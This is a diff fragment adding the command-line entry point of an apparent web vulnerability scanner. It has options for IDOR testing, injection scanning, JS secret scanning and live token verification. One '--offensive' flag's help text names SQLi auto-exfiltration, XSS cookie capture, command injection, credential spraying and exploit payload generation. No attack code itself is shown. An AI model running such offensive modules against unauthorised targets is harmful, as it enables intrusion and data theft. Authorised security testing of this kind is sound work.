+    parser.add_argument("--endpoint", default="/api/v1/user/{id}",
+                         help="Endpoint template with {id} placeholder for IDOR testing")
+    parser.add_argument("--ids", default="1,2,3,100,1000",
+                         help="Comma-separated candidate IDs for unauthenticated suspected-IDOR scan")
+    parser.add_argument("--session-a", help="Header for account A, e.g. 'Authorization: Bearer TOKEN'")
+    parser.add_argument("--session-b", help="Header for account B (owns --resource-id)")
+    parser.add_argument("--resource-id", help="Resource ID owned by account B, for CONFIRMED-tier IDOR")
+    parser.add_argument("--skip-injection", action="store_true", help="Skip XSS/SQLi/open-redirect scanning")
+    parser.add_argument("--skip-js-secrets", action="store_true", help="Skip JS secret scanning")
+    parser.add_argument("--auth-check-url",
+                        help="Optional safe URL used to verify the authenticated session")
+    parser.add_argument("--auth-check-marker",
+                        help="Optional marker expected only in the authenticated response")
+    parser.add_argument("--auth-session-file",
+                        help="JSON file containing authorized session headers/cookies for authenticated scanning")
+    parser.add_argument("--verify-secrets", action="store_true",
+                        help="Opt-in: send supported discovered tokens to provider APIs for live verification")
+    parser.add_argument("--offensive", action="store_true",
+                         help="Activate offensive modules: SQLi auto-exfil, XSS cookie capture, "
+                              "auth bypass, directory bruteforce, LFI/RFI, command injection, "
+                              "credential spraying, and exploit payload generation")
+    args = parser.parse_args()
+    raw_target = args.target
+    if not raw_target:
+        raw_target = input("\033[92m[?] TARGET DOMAIN: \033[0m").strip()
+    if not raw_target:
+        print("\033[91m[!] ERROR: NO TARGET SPECIFIED.\033[0m")
+        sys.exit(1)
+    target = normalize_scan_target(raw_target)
+    _load_auth_session(args.auth_session_file)
+
+    global NUCLEI_PROCESS_TIMEOUT
+    if args.nuclei_process_timeout is not None:
+        NUCLEI_PROCESS_TIMEOUT = max(10.0, args.nuclei_process_timeout)
+
+
+    turbo = args.turbo
+    if not turbo and not args.session_a and not args.offensive:
+        raw_mode = input("[?] Mode: (1) Turbo [Critical Only] | (2) Deep [Full Spectrum]: ").strip()
+        turbo = raw_mode.strip() == "1"
+
+    session_a = _parse_header(args.session_a) if args.session_a else None
+    session_b = _parse_header(args.session_b) if args.session_b else None
+    candidate_ids = [i.strip() for i in args.ids.split(",") if i.strip()]
+
+    buraq_master(target, turbo, args.endpoint, candidate_ids, args.scope_file,
+                 session_a, session_b, args.resource_id,
+                 args.skip_injection, args.skip_js_secrets,
+                 offensive=args.offensive,
+                 verify_secrets=args.verify_secrets,
+                 auth_check_url=args.auth_check_url,
+                 auth_check_marker=args.auth_check_marker)
+
+if __name__ == "__main__":
+    main()
